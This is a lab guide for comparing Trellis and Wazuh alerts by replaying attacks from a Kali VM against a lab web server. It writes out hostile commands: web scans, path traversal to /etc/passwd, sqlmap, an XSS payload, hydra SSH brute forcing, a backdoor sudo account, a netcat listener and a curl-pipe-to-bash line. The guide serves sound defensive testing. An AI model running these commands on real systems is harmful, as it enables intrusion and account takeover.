# Attack scenarios

The same attack story as Trellis's sample logs, run for real from the Kali
VM against `web01`, so Trellis and Wazuh can be compared on identical
traffic.

**Only run these against your own lab VMs.** Every command targets
`192.168.56.10` (`web01`); change it if yours differs.

For each scenario, the *Expected Wazuh alerts* column lists the built-in rules
(Wazuh 4.14.7 ruleset) that should fire. That comes from reading the
ruleset, so confirm it in the dashboard and record what actually happened
in [comparison.md](comparison.md).

Tip: before each run, note the time. Afterwards open vigil, set the range
to **1h**, and click the Kali IP (`192.168.56.20`) to see the whole run as
an attack chain.

---

## 1. Web reconnaissance

```bash
nikto -h http://192.168.56.10 -maxtime 60s
gobuster dir -u http://192.168.56.10 -w /usr/share/wordlists/dirb/common.txt -q
```

| Expected Wazuh alerts | Trellis rules |
|---|---|
| `31101` Web server 400 error code (one per 404) | `web-404-flood` |
| `31151` Multiple 400 errors from same source IP (14 in 90 s) | `web-scanner-user-agent` |
| `31508` Blacklisted user agent: probably **not**, since it only matches a User-Agent that *starts* with `Nikto` and modern Nikto sends `Mozilla/5.00 (Nikto/…)`. Worth confirming. | `web-sensitive-file-probe` |

## 2. Web attacks

```bash
# path traversal
curl -s "http://192.168.56.10/download?file=../../../../etc/passwd" -o /dev/null
# SQL injection (sqlmap tags its own User-Agent)
sqlmap -u "http://192.168.56.10/products.php?id=1" --batch --level 1 --risk 1 --flush-session
# XSS
curl -s "http://192.168.56.10/search?q=%3Cscript%3Ealert(1)%3C/script%3E" -o /dev/null
```

| Expected Wazuh alerts | Trellis rules |
|---|---|
| `31104` Common web attack (traversal) | `web-path-traversal` |
| `31103` SQL injection attempt, `31152` if 8+ in 120 s | `web-sql-injection` |
| `31105` XSS attempt | `web-xss` |
| `31106` A web attack returned code 200 | (no equivalent: a nice Wazuh extra) |

## 3. SSH password spraying

```bash
printf "admin\nroot\ntest\noracle\npostgres\nubuntu\ngit\nsupport\n" > users.txt
hydra -L users.txt -p Winter2026 -t 2 ssh://192.168.56.10
```

| Expected Wazuh alerts | Trellis rules |
|---|---|
| `5710` Login with non-existent user (per attempt) | `ssh-password-spray` |
| `5712` Brute force with non-existent users (8 in 120 s) | |

## 4. SSH brute force that succeeds

```bash
printf "123456\npassword\nqwerty\nletmein\ndragon\nmonkey\nabc123\nsunshine\n" > pw.txt
hydra -l deploy -P pw.txt -t 1 ssh://192.168.56.10
ssh deploy@192.168.56.10      # log in with the password hydra found
```

| Expected Wazuh alerts | Trellis rules |
|---|---|
| `5760` Authentication failed (per attempt) | `ssh-brute-force` |
| `5763` Brute force, authentication failed (8 in 120 s) | `ssh-brute-force-success` |
| `40112` Multiple authentication failures followed by a success (240 s window) | `web-recon-then-ssh-login` (needs scenario 1 first) |

Note that `40112` needs the success within **240 s** of the failures;
Trellis's window is 15 minutes. Wait 5 minutes before logging in once, and
compare.

## 5. Privilege escalation and persistence (inside the SSH session)

```bash
sudo -i                                        # root shell
exit
sudo bash -c 'echo "curl http://192.168.56.20/x.sh | bash" > /dev/null'   # suspicious-looking command, harmless
sudo useradd -m -s /bin/bash support           # backdoor account
sudo usermod -aG sudo support                  # ...with admin rights
sudo -k; sudo -S true <<< "wrong"; sudo -S true <<< "wrong"; sudo -S true <<< "wrong"   # 3 bad sudo passwords
```

| Expected Wazuh alerts | Trellis rules |
|---|---|
| `5402` Successful sudo to ROOT (level 3, every sudo) | `sudo-root-shell`, `sudo-suspicious-command` |
| `5902` New user added to the system | `local-user-created` |
| `5401` / `5404` Failed sudo / three failed attempts | `sudo-password-failures` |
| none expected for `usermod -aG sudo` (see comparison) | `user-added-to-admin-group` |

## 6. A new listening port

```bash
# inside the SSH session on web01: a listener like a backdoor would open
nohup nc -lvnp 4444 >/dev/null 2>&1 &
```

Wazuh's agent runs `netstat` every 6 minutes and diffs the output.

| Expected Wazuh alerts | Trellis rules |
|---|---|
| `533` Listened ports status (netstat) changed, within ~6 min | `new-open-port` (from a GrapeVine scan) |

Clean up afterwards: `pkill -f "nc -lvnp"`, `sudo userdel -r support`.
